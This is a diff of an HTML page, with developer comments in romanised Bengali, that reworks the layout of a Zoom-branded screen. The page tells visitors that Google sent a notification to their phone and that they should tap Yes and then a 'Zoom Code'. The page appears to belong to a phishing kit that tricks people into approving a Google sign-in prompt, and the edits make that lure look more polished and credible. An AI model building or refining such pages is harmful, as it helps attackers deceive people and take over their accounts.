@@ -23,17 +23,17 @@
       overflow-x: hidden;
     }
 
-    /* Professional layout container */
+    /* Layout fix kora holo: space-between shoriye flex-start dewa hoyeche jate faka na thake */
     .container {
       width: 100%;
-      height: 100dvh;
-      height: 100vh;
+      min-height: 100dvh;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
+      justify-content: flex-start; /* Ei line tai faka jayga bondho korbe */
       align-items: center;
       text-align: center;
-      padding: 1.5vh 5vw 2vh 5vw;
+      padding: 6vh 5vw 4vh 5vw;
       background: #ffffff;
       max-width: 440px;
       margin: 0 auto;
@@ -45,8 +45,7 @@
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.4vh;
-      margin-top: 0.5vh;
+      gap: 0.6vh;
     }
 
     /* Zoom Logo */
@@ -88,7 +87,7 @@
       padding: 5px 15px;
       border: 1px solid #dadce0;
       border-radius: 20px;
-      margin-top: 0.3vh;
+      margin-top: 0.5vh;
       background: #fff;
     }
 
@@ -109,17 +108,17 @@
       color: #5f6368;
     }
 
-    /* Center Content Wrapper (Phone + Text grouped together and pulled slightly up) */
+    /* Phone Graphic ebong Text ek sathe rakhbe. margin-top diye faka control kora hoyeche */
     .center-content {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 1vh;
-      margin-top: -1vh;
+      gap: 1.5vh;
+      margin-top: 5vh; /* Uporer ongsho theke fixed gap */
     }
 
-    /* Phone Graphic Illustration - Ektu opore uthano holo */
+    /* Phone Graphic Illustration */
     .phone-illustration {
       width: 60vw;
       max-width: 250px;
@@ -128,32 +127,38 @@
       object-fit: contain;
     }
 
-    /* Text Group - Shob text bold kora holo */
+    /* Text Group */
     .text-group {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.5vh;
+      gap: 0.8vh;
     }
 
-    /* Sub Heading - Bold */
+    /* Check your phone - Bold kora */
     h2 {
       font-size: clamp(23px, 6vw, 29px);
       font-weight: 600;
       color: #202124;
     }
 
-    /* Description Text - Shob lines bold kora holo */
+    /* Description Text base style */
     .desc-text {
       font-size: clamp(17px, 4.7vw, 21px);
-      font-weight: 600;
       color: #3c4043;
-      line-height: 1.4;
+      line-height: 1.45;
       max-width: 400px;
+      font-weight: 400;
     }
 
-    /* Resend / Action Button - Text-er niche ebong ektu opore uthano */
+    /* Specific line gulo Bold korar jonno */
+    .desc-text .bold-text {
+      font-weight: 600;
+      color: #202124;
+    }
+
+    /* Resend / Action Button */
     .btn-join {
       background-color: #1a73e8;
       color: white;
@@ -166,7 +171,7 @@
       border-radius: 6px;
       cursor: pointer;
       transition: background-color 0.2s;
-      margin-bottom: 0.5vh;
+      margin-top: 3.5vh; /* Text er thik nisei bosiye dewa holo */
     }
 
     .btn-join:hover {
@@ -195,20 +200,20 @@
       </div>
     </div>
 
-    <!-- Phone illustration and bold text grouped together -->
+    <!-- Phone illustration and bold text -->
     <div class="center-content">
       <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
       <div class="text-group">
         <h2>Check your phone.</h2>
         <p class="desc-text">
           Google sent a notification to your phone.<br>
-          Tap Yes on the notification<br>
-          Then Tap Zoom Code
+          <span class="bold-text">Tap Yes on the notification</span><br>
+          <span class="bold-text">Then Tap Zoom Code</span>
         </p>
       </div>
     </div>
 
-    <!-- Resend button text-er niche ebong ektu opore -->
+    <!-- Resend button ekhon ar bottom e jabe na, text er kachakachi thakbe -->
     <button class="btn-join" onclick="window.location.href='../'">Resend</button>
   </div>
 
